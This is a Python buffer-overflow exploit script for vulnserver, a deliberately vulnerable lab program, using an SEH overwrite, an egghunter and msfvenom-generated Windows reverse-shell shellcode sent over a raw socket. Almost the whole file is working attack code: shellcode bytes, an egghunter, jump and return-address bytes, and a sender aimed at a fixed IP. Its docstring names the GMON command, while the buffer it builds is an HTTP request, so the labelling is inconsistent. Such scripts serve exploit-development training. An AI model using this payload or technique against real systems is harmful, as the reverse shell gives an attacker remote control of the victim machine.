#!/usr/bin/python3
"""Exploit code for vulnserver GMON seh overwrite with egghunter"""

import socket
import struct


def add_chars() -> bytes:
    """Returns list of all possible bytes for testing bad characters"""
    # bad_chars: \x00
    chars = b""
    chars += b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
    chars += b"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
    chars += b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
    chars += b"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
    chars += b"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
    chars += b"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
    chars += b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
    chars += b"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
    chars += b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
    chars += b"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
    chars += b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
    chars += b"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
    chars += b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
    chars += b"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
    chars += b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
    chars += b"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
    return chars


def add_pattern() -> bytes:
    """Reads pattern file and returns bytes"""
    with open("pattern1k.txt") as in_file:
        pattern = in_file.readline()
    return bytes(pattern, "utf-8")


def add_shellcode() -> bytes:
    """ Returns shellcode generated by msfvenom"""
    # msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread lhost=eth0 lport=4444 -f python -e x86/alpha_mixed
    shellcode = b"flopflop"
    shellcode += b"\x89\xe0\xdb\xd4\xd9\x70\xf4\x5d\x55\x59\x49\x49\x49"
    shellcode += b"\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
    shellcode += b"\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
    shellcode += b"\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
    shellcode += b"\x58\x50\x38\x41\x42\x75\x4a\x49\x6b\x4c\x38\x68\x4c"
    shellcode += b"\x42\x57\x70\x47\x70\x45\x50\x33\x50\x4c\x49\x5a\x45"
    shellcode += b"\x30\x31\x6b\x70\x61\x74\x4c\x4b\x36\x30\x74\x70\x4c"
    shellcode += b"\x4b\x43\x62\x46\x6c\x4c\x4b\x33\x62\x76\x74\x4e\x6b"
    shellcode += b"\x72\x52\x64\x68\x56\x6f\x4d\x67\x43\x7a\x67\x56\x36"
    shellcode += b"\x51\x79\x6f\x4e\x4c\x35\x6c\x45\x31\x63\x4c\x64\x42"
    shellcode += b"\x34\x6c\x51\x30\x5a\x61\x6a\x6f\x56\x6d\x67\x71\x49"
    shellcode += b"\x57\x38\x62\x6a\x52\x53\x62\x63\x67\x4e\x6b\x53\x62"
    shellcode += b"\x76\x70\x6e\x6b\x72\x6a\x47\x4c\x6c\x4b\x42\x6c\x47"
    shellcode += b"\x61\x72\x58\x48\x63\x50\x48\x63\x31\x4e\x31\x70\x51"
    shellcode += b"\x4c\x4b\x63\x69\x67\x50\x43\x31\x4e\x33\x6c\x4b\x57"
    shellcode += b"\x39\x52\x38\x39\x73\x75\x6a\x33\x79\x6e\x6b\x76\x54"
    shellcode += b"\x6e\x6b\x37\x71\x38\x56\x75\x61\x49\x6f\x4e\x4c\x59"
    shellcode += b"\x51\x58\x4f\x56\x6d\x35\x51\x58\x47\x30\x38\x39\x70"
    shellcode += b"\x30\x75\x5a\x56\x67\x73\x51\x6d\x6c\x38\x65\x6b\x31"
    shellcode += b"\x6d\x71\x34\x44\x35\x4d\x34\x71\x48\x4c\x4b\x51\x48"
    shellcode += b"\x34\x64\x77\x71\x4b\x63\x65\x36\x4e\x6b\x64\x4c\x52"
    shellcode += b"\x6b\x6e\x6b\x61\x48\x57\x6c\x55\x51\x38\x53\x4e\x6b"
    shellcode += b"\x64\x44\x4e\x6b\x76\x61\x4e\x30\x6b\x39\x53\x74\x44"
    shellcode += b"\x64\x35\x74\x73\x6b\x71\x4b\x31\x71\x71\x49\x72\x7a"
    shellcode += b"\x30\x51\x6b\x4f\x79\x70\x53\x6f\x43\x6f\x53\x6a\x4c"
    shellcode += b"\x4b\x37\x62\x6a\x4b\x6c\x4d\x61\x4d\x33\x58\x70\x33"
    shellcode += b"\x46\x52\x33\x30\x45\x50\x55\x38\x72\x57\x51\x63\x56"
    shellcode += b"\x52\x53\x6f\x31\x44\x63\x58\x42\x6c\x43\x47\x45\x76"
    shellcode += b"\x65\x57\x59\x6f\x6b\x65\x4d\x68\x6a\x30\x45\x51\x47"
    shellcode += b"\x70\x75\x50\x67\x59\x38\x44\x63\x64\x42\x70\x75\x38"
    shellcode += b"\x55\x79\x4f\x70\x72\x4b\x55\x50\x69\x6f\x58\x55\x30"
    shellcode += b"\x50\x66\x30\x62\x70\x66\x30\x43\x70\x46\x30\x77\x30"
    shellcode += b"\x66\x30\x45\x38\x6a\x4a\x66\x6f\x79\x4f\x49\x70\x6b"
    shellcode += b"\x4f\x59\x45\x4e\x77\x62\x4a\x65\x55\x43\x58\x59\x50"
    shellcode += b"\x69\x38\x71\x73\x43\x53\x43\x58\x77\x72\x55\x50\x32"
    shellcode += b"\x31\x51\x4c\x4c\x49\x5a\x46\x63\x5a\x54\x50\x50\x56"
    shellcode += b"\x42\x77\x65\x38\x7a\x39\x6f\x55\x51\x64\x35\x31\x49"
    shellcode += b"\x6f\x5a\x75\x4d\x55\x6b\x70\x43\x44\x46\x6c\x4b\x4f"
    shellcode += b"\x52\x6e\x57\x78\x70\x75\x48\x6c\x35\x38\x68\x70\x4e"
    shellcode += b"\x55\x6d\x72\x36\x36\x79\x6f\x39\x45\x73\x58\x52\x43"
    shellcode += b"\x52\x4d\x33\x54\x63\x30\x6f\x79\x38\x63\x76\x37\x53"
    shellcode += b"\x67\x61\x47\x34\x71\x4c\x36\x31\x7a\x77\x62\x30\x59"
    shellcode += b"\x71\x46\x79\x72\x6b\x4d\x43\x56\x48\x47\x50\x44\x71"
    shellcode += b"\x34\x47\x4c\x47\x71\x75\x51\x6e\x6d\x37\x34\x71\x34"
    shellcode += b"\x76\x70\x4f\x36\x67\x70\x42\x64\x46\x34\x70\x50\x66"
    shellcode += b"\x36\x66\x36\x32\x76\x72\x66\x71\x46\x72\x6e\x36\x36"
    shellcode += b"\x76\x36\x30\x53\x66\x36\x31\x78\x33\x49\x6a\x6c\x35"
    shellcode += b"\x6f\x4f\x76\x6b\x4f\x69\x45\x4c\x49\x79\x70\x30\x4e"
    shellcode += b"\x56\x36\x57\x36\x49\x6f\x64\x70\x73\x58\x66\x68\x4b"
    shellcode += b"\x37\x37\x6d\x35\x30\x4b\x4f\x48\x55\x6f\x4b\x49\x70"
    shellcode += b"\x77\x6d\x74\x6a\x74\x4a\x61\x78\x6c\x66\x7a\x35\x4d"
    shellcode += b"\x6d\x4d\x4d\x69\x6f\x68\x55\x37\x4c\x34\x46\x33\x4c"
    shellcode += b"\x66\x6a\x6d\x50\x79\x6b\x6d\x30\x72\x55\x36\x65\x4f"
    shellcode += b"\x4b\x73\x77\x57\x63\x64\x32\x70\x6f\x31\x7a\x63\x30"
    shellcode += b"\x50\x53\x69\x6f\x6e\x35\x41\x41"
    return shellcode


def build_buf(shellcode: bytes = b"") -> bytes:
    """ Builds buffer for GMON exploit of vulnserver with egghunter"""
    # Bad chars: \x00
    # *************
    # Buffer Layout
    # *************
    #
    # Overflow = 138 
    # Egghunter = 32 (flop)
    # Fill with B to 188
    # nseh jmp back 50 to egghunter
    # 3 byte overwrite seh jmp to nseh 0x0044d9c4
    buf = b"Get / HTTP/1.1\r\n"
    buf += b"Host: " + shellcode + b"\r\n"
    buf += b"User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0\r\n"
    buf += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buf += b"Accept-Language: en-US,en;q0.5\r\n"
    buf += b"Accept-Encoding: gzip, deflate\r\n"
    buf += b"Connection: close\r\n"
    buf += b"Upgrade-Insecure-Requests:1 \r\n"
    buf += b"If-Modified-Since: Wed, "
    buf += b"A" * 138
    buf += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74" # egghunter flopflop
    buf += b"\xef\xb8\x66\x6c\x6f\x70\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7" # egghunter 
    buf += b"B" * (188-138-32)
    buf += b"\xeb\xcc" #neg jmp 50
    buf += b"\xcc" * 2 #nseh
    buf += b"\xc4\xd9\x44" #seh
    buf += b"\r\n\r\n"
    return buf


def send_exploit(ip: str, port: int) -> None:
    """Sends exploit for vulnserver"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    sock.settimeout(5)
    sock.send(build_buf(add_shellcode()))
    try:
        print(sock.recv(1024))
    except socket.timeout:
        pass
    finally:
        sock.close()


if __name__ == "__main__":
    send_exploit("192.168.99.100", 80)
